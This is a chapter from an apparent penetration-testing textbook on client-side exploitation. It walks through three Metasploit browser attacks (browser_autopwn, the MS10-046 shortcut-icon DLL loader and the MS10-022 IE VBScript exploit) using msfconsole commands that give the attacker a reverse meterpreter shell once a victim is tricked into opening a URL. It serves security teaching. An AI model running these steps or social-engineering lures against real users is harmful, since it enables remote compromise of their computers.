- en: Chapter 6. Client-side Exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous chapter we completed the vulnerability-scanning and information-gathering
    phase. In this chapter we will discuss various ways in which we may be able to
    compromise our victim (client). We will cover various techniques such as luring
    a victim to click on a URL or an icon, which ultimately gives us a reverse shell.
  prefs: []
  type: TYPE_NORMAL
- en: What are client-side attacks?
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: With our hands all dirty with some exploitation basics in the previous chapters,
    we now move on to client-side attacks. But to understand client-side attacks,
    we need to first have clear concepts about the client-server architecture, and
    differentiate the attacks between the two components. The server is the main computer
    that shares its resources over the network, and clients—which are other computers
    on the network—use these resources. There is always a negative aspect to every
    story. So, as the server provides services to a client, it may also expose vulnerabilities
    that may be exploited. Now, when an attacker attacks a server, he may be able
    to do a denial-of-service attack on the server, which will ultimately crash all
    its services. This, specifically talking, is a server-side attack, because we
    have actually tried to attack the server and not any of the clients.
  prefs: []
  type: TYPE_NORMAL
- en: A client-side attack is restricted to a client and targets vulnerable services
    and programs that may be running on that particular machine. These days, the trend
    is changing and is more focused on client-side rather than server-side attacks.
    According to a general trend, the server is usually locked down with minimal services
    and restricted access. This makes it very difficult to attack servers and hence
    the black hats get enticed towards the vulnerable clients. There is a large array
    of attacks that may be launched against the clients, such as browser-based attacks
    and vulnerable service exploitation. Also, the client operating systems have multiple
    applications such as a PDF Reader, document reader, and instant messenger. These
    are often not updated or patched for security vulnerabilities, since they are
    left ignored as a security misconfiguration. Hence, it is extremely easy to launch
    an exploit against such vulnerable systems using simple social engineering techniques.
  prefs: []
  type: TYPE_NORMAL
- en: Browser exploits
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Browser vulnerabilities have been known for a very long time. The framework
    and extensions are also at times the reason for exploitation. We have had recent
    news of the compromise of some of the latest versions of browsers such as Chromium,
    Internet Explorer, and Mozilla. The malicious code may exploit any form of ActiveX,
    Java, and Flash, which are in-built in the browser to enhance the user experience.
    Victims who have been affected by such exploits may find their homepage, search
    page, favorites, and bookmarks changed. There may be incidents where the settings
    or Internet options could be altered to decrease the level of browser security,
    and hence make the malwares more prevalent.
  prefs: []
  type: TYPE_NORMAL
- en: Tutorial
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In the tutorial section, we will show you a couple of exploits that run through
    the victim browser.
  prefs: []
  type: TYPE_NORMAL
- en: The first exploit that we will be showing is known as browser autopwn. First
    open up your terminal and launch `msfconsole`. Now type in `use auxiliary/server/browser
    autopwn`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Then type in `show options` to see in detail all the options that we have to
    set in the exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: In the preceding figure, we can see which options are required and which are
    not in the **Required** column. A **yes** indicates that we have to set the option
    and **no** indicates that the option can be used with its default setting. So
    the first option required is `LHOST`. It requires the IP address for the reverse
    connection, so here we set the attacker's machine IP. To do so, type in `set LHOST
    192.168.11.23`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After setting the `LHOST` address, the next thing to set is `SRVHOST`. `SRVHOST`
    means the server localhost address. We set our local machine address by typing
    in `set SRVHOST 192.168.11.23`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now, to set the `SRVPORT`, which means the local port address, we type in `set
    SRVPORT 80`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: All the settings are done. Now it's time to run the auxiliary module; so type
    in `run`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After running the auxiliary module, we can see that it starts the exploit modules
    on the localhost. Also, it provides a malicious URL, which we have to give to
    the victim. This is a simple social engineering technique in which the user is
    lured to click on the malicious URL.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now, when the URL opens in the victim's system, it will send a reverse connection
    to the attacker's system. Let us see how this works.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After running the URL, we can see in `msfconsole` that the reverse connection
    has been established, and the `notepad.exe` process migrates to 1804.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_09.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see the migrated process in the victim's system via Task Manager.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: To check for the `meterpreter` session that was created, type in `sessions`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now select the `meterpreter` session for exploiting the victim's system. For
    selecting the session, the command to be used is `sessions –i <Id>`; for example,
    here we are using `sessions –i 1`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tutorial](img/3589_06_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After selecting a session, we instantly get the `meterpreter` session. We can
    then go for further exploits. For example, in the preceding figure, we can see
    the `sysinfo` command used for checking the system information.
  prefs: []
  type: TYPE_NORMAL
- en: Internet Explorer shortcut icon exploit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Another browser exploit we are going to demonstrate is of shortcut icons that
    contain a malicious DLL. This exploit is a social engineering attack that runs
    on IE 6 under Windows XP. We just need to lure our victim to click on the link
    to run the exploit on his system. Launch `msfconsole` and type in `use windows/browser/ms10_046_shortcut_icon_dllloader`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now type in `show options` to see in detail all the options that we have to
    set in the exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The first option required is `SRVHOST`. It requires the IP address for the reverse
    connection, so here we set the attacker's machine IP by typing in `set SRVHOST
    192.168.0.109`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now set the `SRVPORT` address, which means the local port address, by typing
    in `set SRVPORT 80`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The next option is to set the `URIPATH` path to the default setting by typing
    in `set URIPATH /`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_17.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now all options are set and ready to run the exploit. So type in `exploit`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_18.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now it is up to you to do some clever social engineering. Give the URL to the
    victim and just wait for the reverse connection.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_19.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Opening the URL in the browser will create a shortcut icon and a DLL file. At
    that time, a `meterpreter` session gets created in `msfconsole` and our victim
    has been compromised. Now let us check for sessions by typing in `sessions`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_20.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see here that a session has been created. Now we select the `meterpreter`
    session for exploiting the victim's system. For selecting the session, the command
    to be used is `sessions –i <Id>`; for example, here we are using `sessions –i
    1`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After selecting a session, we successfully receive `meterpreter`; we can then
    go for further exploitation of the client system.
  prefs: []
  type: TYPE_NORMAL
- en: Internet Explorer malicious VBScript code execution exploit
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We have another interesting exploit that is similar to our previous exploit
    and uses the same conditions and software versions. This time we are going to
    show you the code execution vulnerability that occurs when a victim presses the
    *F1* button after a message box that is generated by a malicious VBScript on a
    web page appears.
  prefs: []
  type: TYPE_NORMAL
- en: For using this exploit, launch `msfconsole` and type in `use exploit/windows/browser/ms10_022_ie_vbscript_winhlp32`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now type in `show options` to see all the options that have to be set in the
    exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_23.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The first option required is `SRVHOST`. It requires the IP address for the reverse
    connection, so we set the attacker's machine IP. For example, here we type in
    `set SRVHOST 192.168.0.105`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now we set the `SRVPORT` number by typing in `set SRVPORT 80`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_25.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The next option is to set the `URIPATH` path to the default setting by typing
    in `set URIPATH /`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_26.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now all the options are set and ready to run the exploit, so type in `exploit`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_27.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Next, we just need to use some of our social engineering skills to make our
    victim click on the URL. We give the URL to our victim and make him click on it.
    After opening the URL in Internet Explorer, it pops up a message box showing a
    message, **Welcome! Press F1 to dismiss this dialog.**
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_28.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After *F1* is pressed, the malicious VBScript will run in the browser and send
    a payload named `calc.exe`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_29.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After executing the `.exe` file, it will make a reverse connection to the attacker
    machine and create a `meterpreter` session. Type in `sessions` for checking the
    available sessions.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see here that a session has been created. Now select the `meterpreter`
    session for exploiting the victim's system. For selecting the session, we use
    the command `sessions –i <Id>`; for example, here we are using `sessions –i 1`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_31.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After selecting a session, we successfully receive `meterpreter`; we can then
    go for further exploitation of the victim machine.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter we successfully demonstrated some of the niche client-side exploits.
    These exploits were specifically targeted at the client systems through the browser
    or a malicious link, and some social engineering tricks. A golden rule in the
    security book is never to click on unknown links, and in our case we were able
    to get through the defenses of our victim. This is the best part of Metasploit—the
    arrays of attack vectors are so large that if something does not work, another
    will for sure. So it is a recommendation to all to avoid clicking on links, running
    unknown executable files, and responding to e-mails from malicious people. The
    next chapter will deal with some of the techniques on post-exploitation, so stay
    tuned; we still have a lot of exploit tricks to be learned.
  prefs: []
  type: TYPE_NORMAL
- en: References
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are some helpful references that shed further light on some of
    the topics covered in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://blog.botrevolt.com/what-are-client-side-attacks/](http://blog.botrevolt.com/what-are-client-side-attacks/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://en.wikipedia.org/wiki/Browser_exploit](http://en.wikipedia.org/wiki/Browser_exploit)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.securitytube.net/video/2697](http://www.securitytube.net/video/2697)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
